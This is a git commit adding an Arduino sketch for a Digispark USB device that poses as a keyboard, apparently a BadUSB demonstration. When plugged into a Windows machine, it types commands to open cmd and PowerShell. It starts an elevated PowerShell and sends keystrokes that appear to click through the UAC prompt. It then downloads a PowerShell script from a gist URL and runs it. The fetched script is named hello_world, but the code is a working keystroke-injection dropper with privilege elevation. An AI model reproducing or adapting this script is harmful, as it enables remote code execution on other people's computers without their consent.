9d232ed2e5b67d5eb86d3e219612fc703724d23f
pawelsupel <72998776+pawelsupel@users.noreply.github.com>
2021-09-25 00:15:34 +0200

    Init

---
+++ sketch_sep24a/sketch_sep24a.ino
@@ -0,0 +1,50 @@
+#include "DigiKeyboard.h"
+#define KEY_TAB               0x2B     // Keyboard Tab
+
+void setup() {
+  // don't need to set anything up to use DigiKeyboard
+}
+
+
+void loop() {
+  // this is generally not necessary but with some older systems it seems to
+  // prevent missing the first character after a delay:
+  DigiKeyboard.sendKeyStroke(0);
+  
+  // Type out this string letter by letter on the computer (assumes US-style
+  // keyboard)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(300);
+  DigiKeyboard.print(F("cmd"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);    
+  DigiKeyboard.delay(1000);
+  
+  DigiKeyboard.print(F("powerShell"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("start-process PowerShell -verb runas"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //the next two lines minimize the cmd window
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.sendKeyStroke(KEY_TAB);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("Invoke-WebRequest https://gist.githubusercontent.com/chaliy/909561/raw/6c4b671104d73b85e79b19f2f656c9a9cac0c147/hello_world.ps1 -OutFile C:/tmp/hello_world.ps1"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F("cd C:/tmp"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print(F(".\\hello_world.ps1"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(100000);
+  exit(0);
+}
